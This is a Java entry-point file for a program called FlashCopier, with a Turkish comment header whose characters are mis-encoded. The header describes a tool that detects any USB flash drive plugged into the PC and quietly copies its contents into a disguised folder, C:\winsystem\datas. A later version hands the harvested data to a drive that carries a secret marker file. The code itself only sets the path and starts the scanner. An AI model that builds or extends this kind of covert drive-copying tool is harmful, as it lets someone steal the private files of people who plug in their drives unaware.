/*
 * iþ bu tüm haklarý Recai Furkan Bostancýya aittir
 * bu versiyon önceki formatýn acýsýna binaen daha güzel geliþtirlmiþtir.
 * önceki vrrsiyonda pc de flashý çýkarmak gerekiyordu ama bunda ona gerek yok
 * bu versiyon format sonrasý versiyondur.
 * v-1.0.0
 * Flashscanner sýnýfý pcye flash takýldý mý çýkartýldý mý diye bakar
 * eðer
 * takýlmýþsa kopyalamaya baþlar
 * eðer çýkartýlmýþsa biþey yapmaz ne yapsýn yani
 * aynýysa zaten biþey yapmaz
 * bizim için önemli olan yeni bir flash eklenmiþ mi eklenmemiþ mi onu öðrenmek
 * 
 * baba version1.0.1 yayýnlandý
 * bu versiyonda geri kendi kendine kopyalama özelliði eklendi
 * çalýþma prensibi flasta ownFalsh.txt var mý diye bakýyor
 * varsa winsystem datas içindekileri fönüyor
 * içinde kopyala.txt varsa onu alýp flasha kopyalýyor
 * yoksa devam bulana kadar ararr iþteü
 * 
 * version 1.0.2 yayýnlandý ayný gün
 * flas içinde durum bilgisi veriyor kopyalamyla ilgili
 * kopyalama anýnda kopyalanýyor diye dosya oluþturmakta
 * tamjamdýðýnda tamamlandý diye klasör oluþturmakta
 * 
 * 
 * 
 */

package FlashCopier;

public class Main {
	public static String destPath = "C:\\winsystem\\datas";

	public static void main(String[] args) {
		FlashScanner scanner = new FlashScanner();
		scanner.waitForNotifying();

	}

}
